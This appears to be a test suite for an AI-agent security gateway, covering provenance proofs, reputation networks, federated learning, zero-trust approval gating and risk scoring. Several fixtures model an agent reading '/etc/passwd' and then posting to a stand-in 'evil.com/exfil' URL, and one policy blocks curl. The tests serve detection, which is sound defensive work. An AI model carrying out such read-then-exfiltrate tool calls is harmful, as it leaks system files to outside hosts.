import { describe, it, expect, beforeEach } from 'vitest';
import { HistoryDatabase } from '../../src/database/history-db.js';
import { IndustryStandardStore } from '../../src/database/industry-standard-store.js';
import { FleetChainDetector } from '../../src/agentic/cross-chain/fleet-chain-detector.js';
import { DigitalTwinCapture } from '../../src/agentic/digital-twin/twin-capture.js';
import { InsuranceRiskQuantifier } from '../../src/agentic/insurance/risk-quantifier.js';
import { ThreatPredictor } from '../../src/agentic/threat-prediction/predictor.js';
import { RiskScorer } from '../../src/agentic/threat-prediction/risk-scorer.js';
import { EcosystemObservatory } from '../../src/agentic/observatory/ecosystem-observatory.js';
import { ReputationNetwork } from '../../src/agentic/reputation/reputation-network.js';
import { ZeroTrustVerificationEngine } from '../../src/agentic/zero-trust/verification-engine.js';
import { ApprovalGate } from '../../src/agentic/core.js';
import {
  clearStepUpStateForTests,
  isStepUpCleared,
  stepUpSessionKey,
} from '../../src/agentic/zero-trust/step-up-session.js';
import {
  bindPolicyApprovalStore,
  clearPolicyDraftsForTests,
  getPolicyDraft,
  markPolicyDraftApproved,
  storePolicyDraft,
} from '../../src/agentic/semantic-policy/policy-approval-store.js';
import { ConfigProvenanceChain } from '../../src/agentic/provenance/config-provenance-chain.js';
import { verifyMerkleProof } from '../../src/agentic/provenance/merkle-tree.js';
import { scoreCausalGraphConfidence, computeGraphNeuralScore } from '../../src/agentic/cross-chain/graph-scorer.js';
import { verifyReputationAttestation } from '../../src/agentic/reputation/reputation-attestation.js';
import { FederatedLearningCoordinator } from '../../src/agentic/federated/federated-learning.js';
import { secureAggregateWeightVectors, scoreWithAggregatedWeights } from '../../src/agentic/federated/federated-weight-aggregation.js';
import { BehaviorFingerprintEngine } from '../../src/agentic/biometrics/behavior-fingerprint.js';
import { MCPCertifier } from '../../src/agentic/certification/certifier.js';
import { runDigitalTwinReplayHarness } from '../../src/agentic/digital-twin/replay-harness.js';
import {
  computeLocalGradient,
  fedAvgGradients,
  applyGradientToWeights,
} from '../../src/agentic/federated/federated-gradient-aggregation.js';
import { computeTransitiveTrust } from '../../src/agentic/reputation/reputation-web-of-trust.js';
import { exportGraphFeatures } from '../../src/agentic/cross-chain/graph-scorer.js';
import { fleetRegion, fleetPeerRegions } from '../../src/agentic/cross-chain/fleet-chain-redis.js';
import { mergeRatingsWithQuorum } from '../../src/agentic/reputation/reputation-quorum.js';
import { cloudPayloadToLocalMetrics, mergeCloudIntoSnapshot } from '../../src/agentic/observatory/observatory-cloud-relay.js';
import { trainGraphWeightsFromEvents } from '../../src/agentic/cross-chain/graph-scorer.js';
import {
  maskGradientForUpload,
  sumMaskedGradients,
  unmaskAggregatedGradients,
} from '../../src/agentic/federated/federated-masked-aggregation.js';
import { runRoadmapFleetGraphTrain } from '../../src/cli/roadmap-cmd.js';
import { mkdtempSync, readFileSync, rmSync } from 'fs';
import { join } from 'path';
import { tmpdir } from 'os';

describe('plan compliance phase 2 (100%)', () => {
  it('C1 builds verifiable Merkle inclusion proofs', () => {
    const chain = new ConfigProvenanceChain();
    const events = [
      chain.append({ actor: 'a', eventType: 'policy_apply', resourcePath: '/p1.yaml' }),
      chain.append({ actor: 'a', eventType: 'policy_apply', resourcePath: '/p2.yaml' }),
    ];
    const root = chain.buildMerkleRootFromEvents(events);
    const proof = chain.proveEventInclusion(events, events[0]!.eventId);
    expect(proof).not.toBeNull();
    expect(proof!.root).toBe(root);
    expect(chain.verifyMerkleInclusion(proof!)).toBe(true);
    expect(verifyMerkleProof(proof!)).toBe(true);
  });

  it('B1 signs reputation attestations on rate', () => {
    const net = new ReputationNetwork();
    const entry = net.rateServer({
      serverName: 'signed-server',
      dimensions: { security_posture: 80 },
      raterId: 'rater-1',
    });
    expect(entry.attestationJws).toBeTruthy();
    const verified = verifyReputationAttestation(entry.attestationJws!);
    expect(verified.valid).toBe(true);
    expect(verified.payload?.serverName).toBe('signed-server');
  });

  it('A1 graph scorer boosts causal confidence for cross-server exfil', () => {
    const boosted = scoreCausalGraphConfidence([
      {
        globalSessionId: 's',
        agentId: 'a1',
        serverName: 'fs',
        toolName: 'read_file',
        eventType: 'tool_call',
        blocked: false,
        timestamp: 1,
        argumentsSnapshot: { path: '/etc/passwd' },
      },
      {
        globalSessionId: 's',
        agentId: 'a1',
        serverName: 'wh',
        toolName: 'http_request',
        eventType: 'tool_call',
        blocked: false,
        timestamp: 2,
        argumentsSnapshot: { url: 'https://evil.com/exfil' },
      },
    ], 0.65);
    expect(boosted).toBeGreaterThan(0.65);
  });

  it('A1 graph neural layer boosts cross-server exfil chains', () => {
    const events = [
      {
        globalSessionId: 's',
        agentId: 'a1',
        serverName: 'fs',
        toolName: 'read_file',
        eventType: 'tool_call' as const,
        blocked: false,
        timestamp: 1,
        argumentsSnapshot: { path: '/etc/passwd' },
      },
      {
        globalSessionId: 's',
        agentId: 'a1',
        serverName: 'wh',
        toolName: 'http_request',
        eventType: 'tool_call' as const,
        blocked: false,
        timestamp: 2,
        argumentsSnapshot: { url: 'https://evil.com/exfil' },
      },
    ];
    const gnn = computeGraphNeuralScore(events, 0.65);
    const heuristic = scoreCausalGraphConfidence(events, 0.65);
    expect(gnn).toBeGreaterThanOrEqual(heuristic);
  });

  it('B1 ingests signed remote reputation ratings', () => {
    const net = new ReputationNetwork();
    const local = net.rateServer({
      serverName: 'remote-srv',
      dimensions: { security_posture: 70 },
      raterId: 'peer-a',
    });
    const ingested = net.ingestRemoteRating(local.attestationJws!);
    expect(ingested.ok).toBe(true);
    expect(ingested.entry?.consensusScore).toBeGreaterThan(0);
  });

  it('B3 secure weight aggregation powers federated inference', async () => {
    process.env.GUARDIAN_FEDERATED_LEARNING = 'true';
    process.env.GUARDIAN_FEDERATED_LEARNING_MIN_REPORTS = '1';
    const db = new HistoryDatabase(':memory:');
    const store = new IndustryStandardStore(db);
    const fl = new FederatedLearningCoordinator(undefined, undefined, store);
    fl.submitLocalDelta({ signatureHash: 'sig-a', sampleCount: 5 });
    fl.submitLocalDelta({ signatureHash: 'sig-b', sampleCount: 8 });
    fl.submitLocalDelta({ signatureHash: 'sig-c', sampleCount: 3 });
    const agg = fl.aggregateDeltas(3);
    expect(agg.aggregated).toBe(true);
    expect(fl.getActiveWeights()?.length).toBeGreaterThan(0);

    const result = await fl.runOnnxInference([0.2, 0.5, 0.8, 0.1]);
    expect(result).not.toBeNull();
    expect(result!.modelVersion).toMatch(/^fl-/);

    const { weights } = secureAggregateWeightVectors([
      { signatureHash: 'sig-a', sampleCount: 5 },
      { signatureHash: 'sig-b', sampleCount: 8 },
    ]);
    expect(scoreWithAggregatedWeights([0.5, 0.5, 0.5, 0.5], weights)).toBeGreaterThan(0);

    delete process.env.GUARDIAN_FEDERATED_LEARNING;
    delete process.env.GUARDIAN_FEDERATED_LEARNING_MIN_REPORTS;
  });

  it('A3 honors GUARDIAN_BIOMETRICS_MIN_SAMPLES for warm-up', () => {
    process.env.GUARDIAN_BIOMETRICS_MIN_SAMPLES = '3';
    const engine = new BehaviorFingerprintEngine();
    for (let i = 0; i < 3; i++) {
      engine.observe({ agentId: 'a', toolName: 'read', argBytes: 64, timestamp: Date.now() + i * 1000 });
    }
    const anomaly = engine.scoreAnomaly('a', {
      agentId: 'a',
      toolName: 'read',
      argBytes: 64,
      timestamp: Date.now() + 5000,
    });
    expect(anomaly.reason).not.toMatch(/Insufficient baseline/);
    delete process.env.GUARDIAN_BIOMETRICS_MIN_SAMPLES;
  });

  it('B3 federated rollout traffic split and blocked signature collection', () => {
    process.env.GUARDIAN_FEDERATED_LEARNING = 'true';
    process.env.GUARDIAN_FEDERATED_LEARNING_MIN_REPORTS = '1';
    const fl = new FederatedLearningCoordinator();
    fl.recordBlockedSignature('inj:test');
    expect(fl.getStats().deltaCount).toBeGreaterThanOrEqual(1);
    (fl as unknown as { rolloutStage: string }).rolloutStage = 'canary';
    const routed = Array.from({ length: 100 }, (_, i) => fl.shouldRouteToFederatedModel(`req-${i}`)).filter(Boolean);
    expect(routed.length).toBeGreaterThan(0);
    expect(routed.length).toBeLessThan(30);
    fl.promoteRolloutStage();
    expect(fl.getRolloutStage()).toBe('partial');
    delete process.env.GUARDIAN_FEDERATED_LEARNING;
    delete process.env.GUARDIAN_FEDERATED_LEARNING_MIN_REPORTS;
  });

  it('C3 SPIFFE workload identity elevates zero-trust score', () => {
    process.env.GUARDIAN_SPIFFE_SOCKET_PATH = '/run/spire/sockets/agent.sock';
    const engine = new ZeroTrustVerificationEngine();
    const score = engine.score({
      agentId: 'a',
      sessionId: 's',
      serverName: 'fs',
      toolName: 'read',
      authenticated: true,
      spiffeId: 'spiffe://example.org/agent/workload',
    });
    expect(score.dimensions.spiffe).toBeGreaterThan(0.95);
    delete process.env.GUARDIAN_SPIFFE_SOCKET_PATH;
  });
  it('B1 certifier downgrades when network reputation disagrees', () => {
    const net = new ReputationNetwork();
    net.rateServer({
      serverName: 'overcert',
      packageName: 'pkg',
      dimensions: {
        security_posture: 30, auth_strength: 30, cve_hygiene: 30, publisher_trust: 30,
        policy_compliance: 30, uptime: 30, community_rating: 30, guardian_protected: 30,
      },
    });
    const certifier = new MCPCertifier(undefined, undefined, net);
    const result = certifier.certify('overcert', 'pkg', '1.0.0', {
      trustScore: 95,
      complianceScore: 95,
      cveFree: true,
      authMethod: 'oauth',
      transport: 'mTLS',
      trustedPublisher: true,
    });
    expect(result.checks.some(c => c.id === 'network-reputation' && !c.passed)).toBe(true);
    expect(result.level).not.toBe('platinum');
  });

  it('A2 captured-only replay skips adversarial corpus', async () => {
    const replay = await runDigitalTwinReplayHarness({
      serverName: 'filesystem',
      capturedTrafficOnly: true,
      maxSamples: 10,
    });
    expect(replay.capturedReplayed).toBe(0);
    expect(replay.attacksTotal).toBe(0);
  });

  it('B3 FedAvg gradient aggregation updates weights', () => {
    const w = [0.1, 0.2, 0.3];
    const g1 = computeLocalGradient([0.5, 0.6, 0.7], 1, w);
    const g2 = computeLocalGradient([0.4, 0.5, 0.6], 1, w);
    const avg = fedAvgGradients([{ gradient: g1, sampleCount: 3 }, { gradient: g2, sampleCount: 5 }]);
    const next = applyGradientToWeights(w, avg);
    expect(next.some((v, i) => v !== w[i])).toBe(true);
  });

  it('B1 web-of-trust propagates anchor trust to peer raters', () => {
    const trust = computeTransitiveTrust('peer-b', [
      { fromRaterId: 'anchor', toRaterId: 'peer-a', weight: 0.9 },
      { fromRaterId: 'peer-a', toRaterId: 'peer-b', weight: 0.8 },
    ], 'anchor');
    expect(trust).toBeGreaterThan(0.5);
  });

  it('A1 exports graph features for training pipeline', () => {
    const matrix = exportGraphFeatures([
      {
        globalSessionId: 's',
        agentId: 'a',
        serverName: 'fs',
        toolName: 'read_file',
        eventType: 'tool_call',
        blocked: false,
        timestamp: 1,
      },
    ]);
    expect(matrix[0]?.length).toBe(8);
  });

  it('A1 multi-region fleet redis keys include region tag', () => {
    process.env.GUARDIAN_FLEET_REGION = 'us-east-1';
    expect(fleetRegion()).toBe('US-EAST-1');
    process.env.GUARDIAN_FLEET_PEER_REGIONS = 'eu-west-1';
    expect(fleetPeerRegions()).toContain('EU-WEST-1');
    delete process.env.GUARDIAN_FLEET_REGION;
    delete process.env.GUARDIAN_FLEET_PEER_REGIONS;
  });

  it('B1 Byzantine quorum requires min distinct raters', () => {
    const q = mergeRatingsWithQuorum([
      { raterId: 'a', dimensions: { security_posture: 80 }, raterWeight: 1 },
    ]);
    expect(q.quorumMet).toBe(false);
    const q2 = mergeRatingsWithQuorum([
      { raterId: 'a', dimensions: { security_posture: 80 }, raterWeight: 2 },
      { raterId: 'b', dimensions: { security_posture: 60 }, raterWeight: 2 },
    ]);
    expect(q2.quorumMet).toBe(true);
    expect(q2.dimensions?.security_posture).toBeGreaterThan(0);
  });

  it('B2 cloud observatory payload maps to local metrics', () => {
    const metrics = cloudPayloadToLocalMetrics({
      avgBlockRate: 0.9,
      serverCount: 12,
      threatHeatIndex: 55,
      topThreatClasses: [{ cls: 'injection', count: 4 }],
    });
    expect(metrics.some(m => m.metricType === 'block_rate' && m.dimension?.source === 'cloud')).toBe(true);
    const merged = mergeCloudIntoSnapshot(
      { adoptionScore: 10, threatHeatIndex: 20, avgBlockRate: 0.8, serverCount: 5, topThreatClasses: [], generatedAt: '' },
      { threatHeatIndex: 55, serverCount: 12 },
    );
    expect(merged.threatHeatIndex).toBe(55);
    expect(merged.serverCount).toBe(12);
  });

  it('C4 insurance applies fleet/ecosystem risk multiplier', () => {
    const db = new HistoryDatabase(':memory:');
    const store = new IndustryStandardStore(db);
    store.saveObservatoryMetric({ metricType: 'threat_heat', value: 80 });
    store.saveFleetChainAlert({
      alertId: 'a1',
      globalSessionId: 's',
      pattern: 'read-then-exfil',
      confidence: 0.9,
      agents: ['a1'],
      servers: ['fs', 'wh'],
      tools: ['read', 'http'],
      mitreTechniques: ['T1048'],
      description: 'test',
    });
    store.saveFleetChainAlert({
      alertId: 'a2',
      globalSessionId: 's2',
      pattern: 'read-then-exfil',
      confidence: 0.9,
      agents: ['a2'],
      servers: ['fs', 'wh'],
      tools: ['read', 'http'],
      mitreTechniques: ['T1048'],
      description: 'test',
    });
    const q = new InsuranceRiskQuantifier(new ThreatPredictor(), new RiskScorer(), store);
    const base = q.quantify({ serverName: 'srv', toolCount: 10, networkExposure: 0.5, recordsAtRisk: 1000 });
    expect(base.fleetChainMultiplier).toBeGreaterThan(1);
    expect(base.ecosystemThreatHeat).toBeGreaterThan(0);
  });

  it('A1 trainGraphWeightsFromEvents returns tunable weights', () => {
    const weights = trainGraphWeightsFromEvents([
      {
        events: [{
          globalSessionId: 's', agentId: 'a', serverName: 'fs', toolName: 'read_file',
          eventType: 'tool_call', blocked: false, timestamp: 1,
          argumentsSnapshot: { path: '/etc/passwd' },
        }],
        label: 1,
      },
    ], 3);
    expect(weights.w1.length).toBe(8);
    expect(weights.w2.length).toBe(8);
  });

  it('B3 federated model export/import roundtrip', () => {
    process.env.GUARDIAN_FEDERATED_LEARNING = 'true';
    const db = new HistoryDatabase(':memory:');
    const store = new IndustryStandardStore(db);
    const fl = new FederatedLearningCoordinator(undefined, undefined, store);
    fl.importModelBundle({ modelVersion: 'import-v1', weights: [0.1, 0.2, 0.3] });
    const bundle = fl.exportModelBundle();
    expect(bundle.modelVersion).toBe('import-v1');
    expect(bundle.weights.length).toBe(3);
    delete process.env.GUARDIAN_FEDERATED_LEARNING;
  });

  it('B3 MPC-lite masked gradients cancel pairwise masks', () => {
    process.env.GUARDIAN_FEDERATED_MPC_SECRET = 'test-secret';
    const g1 = [0.5, -0.2, 0.1];
    const g2 = [0.3, 0.4, -0.1];
    const roundId = 'round-1';
    const ids = ['p1', 'p2'];
    const m1 = maskGradientForUpload(g1, 'p1', ids, roundId);
    const m2 = maskGradientForUpload(g2, 'p2', ids, roundId);
    const summed = unmaskAggregatedGradients(sumMaskedGradients([m1, m2]), ids, roundId);
    for (let i = 0; i < 3; i++) {
      expect(Math.abs(summed[i]! - (g1[i]! + g2[i]!))).toBeLessThan(0.001);
    }
    delete process.env.GUARDIAN_FEDERATED_MPC_SECRET;
  });

  it('A1 roadmap fleet-graph-train exports weights JSON', () => {
    const dir = mkdtempSync(join(tmpdir(), 'ggraph-'));
    const out = join(dir, 'weights.json');
    const weights = runRoadmapFleetGraphTrain({ output: out });
    expect(weights.w1.length).toBe(8);
    expect(JSON.parse(readFileSync(out, 'utf-8')).w2.length).toBe(8);
    rmSync(dir, { recursive: true, force: true });
  });
});

describe('plan compliance persistence (016)', () => {
  it('persists fleet chain alerts across detector instances', () => {
    const db = new HistoryDatabase(':memory:');
    const store = new IndustryStandardStore(db);
    const d1 = new FleetChainDetector(store);
    d1.record({ globalSessionId: 's-persist', agentId: 'a1', serverName: 'fs', toolName: 'read_file' });
    const alert = d1.record({ globalSessionId: 's-persist', agentId: 'a1', serverName: 'wh', toolName: 'http_request' });
    expect(alert).not.toBeNull();

    const d2 = new FleetChainDetector(store);
    const alerts = d2.getAlerts(10);
    expect(alerts.some(a => a.alertId === alert!.alertId)).toBe(true);
  });

  it('persists digital twin observations and hydrates', () => {
    const db = new HistoryDatabase(':memory:');
    const store = new IndustryStandardStore(db);
    const twin = new DigitalTwinCapture(store);
    twin.record({ serverName: 'srv-a', toolName: 'search', latencyMs: 42, responseShape: 'abc123' });
    twin.record({ serverName: 'srv-a', toolName: 'read', latencyMs: 55, responseShape: 'def456' });

    const twin2 = new DigitalTwinCapture(store);
    twin2.hydrateFromStore('srv-a');
    const snap = twin2.snapshot('srv-a');
    expect(snap?.sampleCount).toBeGreaterThanOrEqual(2);
  });

  it('persists policy draft approvals', () => {
    const db = new HistoryDatabase(':memory:');
    const store = new IndustryStandardStore(db);
    bindPolicyApprovalStore(store);
    clearPolicyDraftsForTests();

    storePolicyDraft({
      requestId: 'draft-1',
      goal: 'block curl',
      rule: { name: 'deny-curl', action: 'block', tools: { deny: ['curl'] } },
      yaml: 'rules:\n  - name: deny-curl',
    });
    expect(getPolicyDraft('draft-1')?.status).toBe('pending');
    expect(markPolicyDraftApproved('draft-1')).toBe(true);

    clearPolicyDraftsForTests();
    bindPolicyApprovalStore(store);
    expect(getPolicyDraft('draft-1')?.status).toBe('approved');
  });
});

describe('plan compliance behavior', () => {
  beforeEach(() => {
    clearStepUpStateForTests();
  });

  it('C3 blocks step-up until approval cleared', () => {
    const gate = new ApprovalGate();
    const engine = new ZeroTrustVerificationEngine(undefined, undefined, undefined, undefined, gate);
    const ctx = {
      agentId: 'agent-zt',
      sessionId: 'sess-zt',
      serverName: 'filesystem',
      toolName: 'write_file',
      authenticated: false,
      dataSensitivity: 'high' as const,
    };
    const first = engine.score(ctx);
    expect(first.action).toBe('step_up');
    expect(first.stepUpRequestId).toBeTruthy();

    const blocked = engine.score(ctx);
    expect(blocked.action).toBe('block');
    expect(blocked.reason).toMatch(/Awaiting zero-trust step-up/);

    gate.approve(first.stepUpRequestId!);
    expect(isStepUpCleared(stepUpSessionKey(ctx.agentId, ctx.sessionId))).toBe(true);

    const cleared = engine.score(ctx);
    expect(cleared.action).toBe('allow');
  });

  it('C4 uses ThreatPredictor for exploit probability', () => {
    const q = new InsuranceRiskQuantifier(new ThreatPredictor(), new RiskScorer());
    const report = q.quantify({
      serverName: 'test-server',
      toolCount: 20,
      networkExposure: 0.8,
      recordsAtRisk: 5000,
    });
    expect(report.exploitProbability).toBeGreaterThan(0);
    expect(report.forecastConfidence).toBeDefined();
    expect(report.aleUsd).toBeGreaterThan(0);
  });

  it('B2 emits proactive alerts on low block rate', () => {
    const obs = new EcosystemObservatory();
    obs.recordMetric('block_rate', 0.5);
    obs.recordMetric('server_count', 3);
    const alerts = obs.evaluateProactiveAlerts();
    expect(alerts.some(a => a.alertType === 'low_block_rate')).toBe(true);
  });

  it('B1 validates cert level against network reputation', () => {
    const net = new ReputationNetwork();
    net.rateServer({
      serverName: 'bad-server',
      dimensions: { security_posture: 30, auth_strength: 30, cve_hygiene: 30, publisher_trust: 30,
        policy_compliance: 30, uptime: 30, community_rating: 30, guardian_protected: 30 },
    });
    const check = net.validateCertAgainstReputation('bad-server', 'platinum');
    expect(check.valid).toBe(false);
    expect(check.networkLevel).toBe('bronze');
  });
});
